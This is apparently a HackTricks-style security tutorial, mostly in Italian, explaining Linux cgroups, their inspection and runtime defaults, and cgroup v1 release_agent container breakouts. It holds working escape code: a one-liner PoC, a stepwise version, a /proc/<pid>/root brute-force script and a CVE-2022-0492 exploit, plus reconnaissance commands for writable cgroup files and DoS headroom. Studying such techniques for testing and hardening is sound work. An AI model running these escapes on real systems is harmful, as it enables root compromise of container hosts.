# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Panoramica

Linux **control groups** sono il meccanismo del kernel usato per raggruppare i processi insieme per accounting, limitazione, prioritizzazione e applicazione di policy. Se i namespaces servono principalmente a isolare la vista delle risorse, i cgroups servono principalmente a governare **quanto** di quelle risorse un insieme di processi può consumare e, in alcuni casi, **con quali classi di risorse** possono interagire. I container dipendono costantemente dai cgroups, anche quando l'utente non li guarda direttamente, perché quasi tutti i runtime moderni hanno bisogno di un modo per dire al kernel "questi processi appartengono a questo workload, e queste sono le regole di risorse che si applicano a loro".

Per questo motivo i container engine collocano un nuovo container nel proprio sottoalbero di cgroup. Una volta che l'albero dei processi è lì, il runtime può limitare la memoria, limitare il numero di PID, pesare l'uso della CPU, regolare l'I/O e restringere l'accesso ai device. In ambiente di produzione questo è essenziale sia per la sicurezza multi-tenant sia per una semplice igiene operativa. Un container senza controlli di risorse significativi può essere in grado di esaurire la memoria, inondare il sistema di processi o monopolizzare CPU e I/O in modi che rendono instabile l'host o i workload vicini.

Da una prospettiva di sicurezza, i cgroups contano in due modi separati. Primo, limiti di risorse errati o mancanti permettono attacchi di denial-of-service diretti. Secondo, alcune funzionalità dei cgroup, specialmente in vecchie configurazioni di **cgroup v1**, storicamente hanno creato potenti primitive di breakout quando erano scrivibili dall'interno di un container.

## v1 Vs v2

Esistono due modelli principali di cgroup in uso. **cgroup v1** espone molteplici gerarchie di controller, e le vecchie writeup di exploit spesso ruotano attorno alle strane e talvolta eccessivamente potenti semantiche disponibili lì. **cgroup v2** introduce una gerarchia più unificata e un comportamento generalmente più pulito. Le distribuzioni moderne preferiscono sempre più spesso cgroup v2, ma esistono ancora ambienti misti o legacy, il che significa che entrambi i modelli sono ancora rilevanti quando si analizzano sistemi reali.

La differenza è importante perché alcune delle storie di breakout da container più famose, come gli abusi di **`release_agent`** in cgroup v1, sono legate molto specificamente al comportamento dei cgroup più vecchi. Un lettore che vede un exploit su un blog e poi lo applica ciecamente a un sistema moderno solo con cgroup v2 probabilmente fraintenderà cosa è effettivamente possibile sul target.

## Ispezione

Il modo più rapido per vedere dove si trova la shell corrente è:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Il file /proc/self/cgroup mostra i percorsi cgroup associati al processo corrente. Su un host moderno con cgroup v2 vedrai spesso una voce unificata. Su host più vecchi o ibridi potresti vedere più percorsi del controller v1. Una volta che conosci il percorso, puoi ispezionare i file corrispondenti sotto /sys/fs/cgroup per vedere limiti e utilizzo corrente.

Su un host con cgroup v2, i seguenti comandi sono utili:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Questi file mostrano quali controller esistono e quali vengono delegati ai cgroups figli. Questo modello di delega è importante negli ambienti rootless e systemd-managed, dove il runtime potrebbe essere in grado di controllare solo il sottoinsieme della funzionalità dei cgroup che la gerarchia padre effettivamente delega.

## Lab

Un modo per osservare i cgroups in pratica è eseguire un memory-limited container:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Puoi anche provare un container con PID limitato:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Questi esempi sono utili perché aiutano a collegare l'opzione del runtime all'interfaccia file del kernel. Il runtime non applica la regola per magia; scrive le impostazioni cgroup rilevanti e poi lascia che il kernel le applichi all'albero dei processi.

## Utilizzo del runtime

Docker, Podman, containerd e CRI-O si affidano tutti ai cgroups nel normale funzionamento. Le differenze di solito non riguardano se usano cgroups, ma piuttosto **quali valori predefiniti scelgono**, **come interagiscono con systemd**, **come funziona la delega rootless**, e **quanto della configurazione è controllato a livello di engine rispetto al livello di orchestrazione**.

In Kubernetes, le richieste e i limiti di risorse diventano infine configurazioni cgroup sul nodo. Il percorso dal Pod YAML all'applicazione da parte del kernel passa attraverso il kubelet, il CRI runtime e l'OCI runtime, ma i cgroups rimangono il meccanismo del kernel che applica finalmente la regola. Negli ambienti Incus/LXC, i cgroups sono usati intensamente, soprattutto perché i system container spesso espongono un albero dei processi più ricco e aspettative operative più simili a VM.

## Errori di configurazione e Breakouts

La classica storia di sicurezza dei cgroup è il meccanismo scrivibile **cgroup v1 `release_agent`**. In quel modello, se un attaccante potesse scrivere sui file cgroup giusti, abilitare `notify_on_release`, e controllare il percorso memorizzato in `release_agent`, il kernel potrebbe finire per eseguire un percorso scelto dall'attaccante nelle initial namespaces sull'host quando il cgroup diventasse vuoto. Ecco perché le analisi più vecchie dedicano tanta attenzione alla scrivibilità del controller cgroup, alle opzioni di mount e alle condizioni di namespace/capability.

Anche quando `release_agent` non è disponibile, gli errori di cgroup contano ancora. Un accesso ai device troppo ampio può rendere i dispositivi dell'host raggiungibili dal container. Limiti di memoria e PID mancanti possono trasformare una semplice esecuzione di codice in un DoS sull'host. Una delega cgroup debole negli scenari rootless può anche indurre in errore i difensori facendoli assumere che esista una restrizione quando il runtime in realtà non è mai stato in grado di applicarla.

### Contesto di `release_agent`

La tecnica `release_agent` si applica solo a **cgroup v1**. L'idea di base è che quando l'ultimo processo in un cgroup esce e `notify_on_release=1` è impostato, il kernel esegue il programma il cui percorso è memorizzato in `release_agent`. Tale esecuzione avviene nelle **initial namespaces sull'host**, ed è questo che trasforma un `release_agent` scrivibile in una primitive di escape da container.

Perché la tecnica funzioni, l'attaccante in genere ha bisogno di:

- una gerarchia **cgroup v1** scrivibile
- la possibilità di creare o usare un cgroup figlio
- la possibilità di impostare `notify_on_release`
- la possibilità di scrivere un percorso in `release_agent`
- un percorso che risolva a un eseguibile dal punto di vista dell'host

### PoC classico

Il PoC storico in una sola riga è:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Questo PoC scrive un percorso del payload in `release_agent`, attiva il rilascio del cgroup e poi legge il file di output generato sull'host.

### Spiegazione passo-passo

La stessa idea è più chiara se suddivisa in passaggi.

1. Crea e prepara un cgroup scrivibile:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Identificare il percorso host che corrisponde al filesystem del container:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Colloca un payload che sarà visibile dal host path:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Innescare l'esecuzione svuotando il cgroup:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
L'effetto è l'esecuzione lato host del payload con privilegi di root. In un exploit reale, il payload di solito scrive un file di prova, avvia una reverse shell o modifica lo stato dell'host.

### Variante a percorso relativo usando `/proc/<pid>/root`

In alcuni ambienti, il percorso host al filesystem del container non è ovvio o è nascosto dal storage driver. In tal caso il percorso del payload può essere espresso tramite `/proc/<pid>/root/...`, dove `<pid>` è un PID dell'host appartenente a un processo nel container corrente. Questa è la base della variante brute-force a percorso relativo:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Il trucco rilevante qui non è la forza bruta in sé, ma la forma del percorso: `/proc/<pid>/root/...` permette al kernel di risolvere un file all'interno del filesystem del container dal namespace host, anche quando il percorso diretto dello storage host non è noto a priori.

### Variante di CVE-2022-0492

Nel 2022, CVE-2022-0492 ha dimostrato che la scrittura su `release_agent` in cgroup v1 non verificava correttamente `CAP_SYS_ADMIN` nel **iniziale** user namespace. Questo rendeva la tecnica molto più accessibile su kernel vulnerabili perché un processo nel container in grado di montare una gerarchia di cgroup poteva scrivere su `release_agent` senza essere già privilegiato nel namespace utente dell'host.

Minimal exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Su un kernel vulnerabile, l'host esegue `/proc/self/exe` con i privilegi di root dell'host.

Per un abuso pratico, inizia verificando se l'ambiente espone ancora percorsi cgroup-v1 scrivibili o accesso a dispositivi pericolosi:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Se `release_agent` è presente e scrivibile, sei già nel territorio legacy-breakout:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Se il percorso cgroup in sé non fornisce un escape, l'uso pratico successivo è spesso denial of service o reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Questi comandi ti dicono rapidamente se il workload ha margine per eseguire un fork-bomb, consumare memoria in modo aggressivo o abusare di un'interfaccia cgroup legacy scrivibile.

## Verifiche

Durante la revisione di un target, lo scopo dei controlli sui cgroup è determinare quale modello di cgroup è in uso, se il container vede percorsi dei controller scrivibili e se primitive di breakout obsolete come `release_agent` siano anche rilevanti.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
What is interesting here:

- If `mount | grep cgroup` shows **cgroup v1**, older breakout writeups become more relevant.
- If `release_agent` exists and is reachable, that is immediately worth deeper investigation.
- If the visible cgroup hierarchy is writable and the container also has strong capabilities, the environment deserves much closer review.

If you discover **cgroup v1**, writable controller mounts, and a container that also has strong capabilities or weak seccomp/AppArmor protection, that combination deserves careful attention. cgroups are often treated as a boring resource-management topic, but historically they have been part of some of the most instructive container escape chains precisely because the boundary between "resource control" and "host influence" was not always as clean as people assumed.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Abilitato per impostazione predefinita | I container vengono collocati nei cgroups automaticamente; i limiti di risorse sono opzionali a meno che non vengano impostati tramite flag | omettendo `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Abilitato per impostazione predefinita | `--cgroups=enabled` è il default; i default del cgroup namespace variano in base alla versione di cgroup (`private` on cgroup v2, `host` on some cgroup v1 setups) | `--cgroups=disabled`, `--cgroupns=host`, accesso ai dispositivi più permissivo, `--privileged` |
| Kubernetes | Abilitato tramite il runtime per impostazione predefinita | Pod e container vengono collocati nei cgroups dal runtime del nodo; il controllo granulare delle risorse dipende da `resources.requests` / `resources.limits` | omettendo resource requests/limits, accesso ai dispositivi privilegiato, misconfigurazione del runtime a livello host |
| containerd / CRI-O | Abilitato per impostazione predefinita | i cgroups fanno parte della normale gestione del ciclo di vita | configurazioni runtime dirette che allentano i controlli sui dispositivi o espongono interfacce legacy scrivibili di cgroup v1 |

The important distinction is that **cgroup existence** is usually default, while **useful resource constraints** are often optional unless explicitly configured.
